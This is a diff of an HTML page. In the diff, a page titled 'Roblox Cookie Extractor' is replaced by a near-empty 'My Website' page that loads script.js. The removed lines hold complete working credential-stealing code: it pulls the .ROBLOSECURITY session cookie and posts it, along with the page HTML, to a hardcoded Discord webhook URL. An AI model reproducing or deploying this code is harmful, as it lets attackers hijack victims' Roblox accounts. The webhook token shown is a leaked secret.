@@ -1,57 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Cookie Extractor</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>My Website</title>
 </head>
 <body>
-    <h1>Welcome to the Roblox Cookie Extractor</h1>
-    <button id="extractButton">Extract Cookies</button>
 
-    <script>
-        document.getElementById('extractButton').addEventListener('click', extractCookies);
+<script src="script.js"></script>
 
-        function extractCookies() {
-            // JavaScript code to extract Roblox cookies
-            var robloxCookie = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
-            if (robloxCookie) {
-                var cookieValue = robloxCookie[1];
-                
-                // Send cookies to Discord webhook
-                sendToDiscordWebhook(cookieValue);
-            }
-        }
-
-        function sendToDiscordWebhook(cookie) {
-            // Discord webhook URL
-            var webhookUrl = 'https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx';
-
-            // Data to send to Discord
-            var data = {
-                robloxCookie: cookie,
-                htmlContent: document.documentElement.outerHTML
-            };
-
-            // Send data to Discord webhook
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Roblox cookie sent to Discord webhook successfully!');
-                } else {
-                    console.error('Failed to send Roblox cookie to Discord webhook:', response.status, response.statusText);
-                }
-            })
-            .catch(error => {
-                console.error('Error sending Roblox cookie to Discord webhook:', error.message);
-            });
-        }
-    </script>
 </body>
 </html>
